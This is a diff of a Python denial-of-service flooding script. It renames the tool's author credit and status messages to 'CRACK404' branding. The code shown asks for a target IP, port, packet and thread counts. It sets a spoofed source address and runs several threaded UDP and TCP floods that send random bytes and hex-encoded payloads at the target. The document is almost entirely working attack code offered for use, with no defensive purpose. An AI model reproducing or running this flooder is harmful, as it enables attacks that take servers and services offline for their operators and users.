@@ -1,5 +1,13 @@
-#AUTHOR : YOFIEL
-#SUBSCRIBE YOFIEL
+#TOOLS IS CRACK CC404
+#TOOLS IS CRACK CC404
+#TOOLS IS CRACK CC404
+#TOOLS IS CRACK CC404
+#TOOLS IS CRACK CC404
+#TOOLS IS CRACK CC404
+#TOOLS IS CRACK CC404
+#TOOLS IS CRACK CC404
+#TOOLS IS CRACK CC404
+#TOOLS IS CRACK CC404
 import random
 import threading
 import codecs
@@ -28,11 +36,11 @@ print("""
 ░░▀▀░░░░░░░░░▀▀██████▀▀░░░▀▀██░░ 
 """)
 
-ip = str(input(" Ip nya dek:"))
-port = int(input(" Port nya belum:"))
-choice = str(input(" Gas Ddos Nich? (y/n):"))
-times = int(input(" Paket nya:"))
-threads = int(input(" Isi paket:"))
+ip = str(input(" IP SERVER:"))
+port = int(input(" PORT SERVER:"))
+choice = str(input(" Y Untuk Mulai N Untuk Gagalkan (y/n):"))
+times = int(input(" PACKETS:"))
+threads = int(input(" THREADS:"))
 fake_ip = '182.21.20.32'
 #Starting Attacking
 Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
@@ -54,9 +62,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" DDOS BY YOFIEL !!!")
+			print(i +" ATTACKING CYBER CRACK404 !!!")
 		except:
-			print("[!] DDOS BY YOFIEL!!!")
+			print("[!] ATTACKING CYBER CRACK404!!!")
 
 def run2():
 	data = random._urandom(1204)
@@ -68,10 +76,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" DDOS BY YOFIEL !!!")
+			print(i +" ATTACKING CYBER CRACK404 !!!")
 		except:
 			s.close()
-			print("[*] DDOS BY YOFIEL!!!")
+			print("[*] ATTACKING CYBER CRACK404!!!")
             
 
 def run3():
@@ -84,10 +92,10 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" DDOS BY YOFIEL!!! ")
+			print(i +" ATTACKING CYBER CRACK404!! ")
 		except:
 			s.close()
-			print("[*] DDOS BY YOFIEL!!!")
+			print("[*] ATTACKING CYBER CRACK404!!!")
             
   
 def run4():
@@ -100,10 +108,10 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" DDOS BY YOFIEL!!! ")
+			print(i +" ATTACKING CYBER CRACK404!!! ")
 		except:
 			s.close()
-			print("[*] DDOS BY YOFIEL!!!")
+			print("[*] ATTACKING CYBER CRACK404!!!")
 			
 def run5():
 	data = random._urandom(16)
@@ -115,10 +123,10 @@ def run5():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" DDOS BY YOFIEL!!!")
+			print(i +" ATTACKING CYBER CRACK404!!!")
 		except:
 			s.close()
-			print("[*] DDOS BY YOFIEL!!!")
+			print("[*] ATTACKING CYBER CRACK404!!!")
             
 #Urandom Dan Pacotes
 class MyThread(threading.Thread):
